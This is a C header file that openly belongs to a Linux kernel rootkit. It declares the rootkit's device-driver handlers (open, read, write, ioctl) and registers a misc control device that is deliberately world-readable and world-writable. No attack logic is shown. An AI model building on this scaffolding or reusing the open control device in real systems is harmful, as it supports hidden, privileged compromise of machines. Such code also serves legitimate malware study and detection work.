/**
 * @file driver.h
 * 
 * @brief Definitions for the rootkit device driver
 * 
 * This file contains the definitions for the rootkit device driver.
 */

#ifndef _RK_DRIVER_H
#define _RK_DRIVER_H

#include <linux/miscdevice.h>
#include <linux/stat.h>

#include "../../include/config.h"

/**
 * @brief The rootkit device driver open function
 * 
 * This function is called when the rootkit device driver is opened.
 */
int rk_driver_open(struct inode *i, struct file *f);

/**
 * @brief The rootkit device driver release function
 * 
 * This function is called when the rootkit device driver is closed.
 */
int rk_driver_release(struct inode *i, struct file *f);

/**
 * @brief The rootkit device driver read function
 * 
 * This function is called when the rootkit device driver is read from.
 */
ssize_t rk_driver_read(struct file *file,
                                char __user *buf,
                                size_t count,
                                loff_t *off);

/**
 * @brief The rootkit device driver write function
 * 
 * This function is called when the rootkit device driver is written to.
 */
ssize_t rk_driver_write(struct file *file,
                                const char __user *buf,
                                size_t len,
                                loff_t *off);

/**
 * @brief The rootkit device driver ioctl function
 * 
 * This function is called when the rootkit device driver receives an ioctl
 */
long rk_driver_ioctl(struct file *file,
                            unsigned int request,
                            unsigned long arg);


/**
 * @brief A structure for the rootkit device driver file operations
 * 
 * This structure defines the file operations for the rootkit device driver.
 */
static struct file_operations fops =
{
    .owner      	    = THIS_MODULE,
    .read       	    = rk_driver_read,
    .write		        = rk_driver_write,
    .open       	    = rk_driver_open,
    .release    	    = rk_driver_release,
    .unlocked_ioctl     = rk_driver_ioctl
};

/**
 * @brief Structure for the rootkit device drivers
 * 
 * @link https://github.com/torvalds/linux/blob/master/include/linux/miscdevice.h#L79
 * 
 * This structure defines the rootkit device driver.
 */
static struct miscdevice rk_miscdevice = {
    .name = RK_DRIVER,
    .minor = MISC_DYNAMIC_MINOR,
    .fops = &fops,
    .mode = ( S_IRUGO |  S_IWUGO )
};

#endif // _RK_DRIVER_H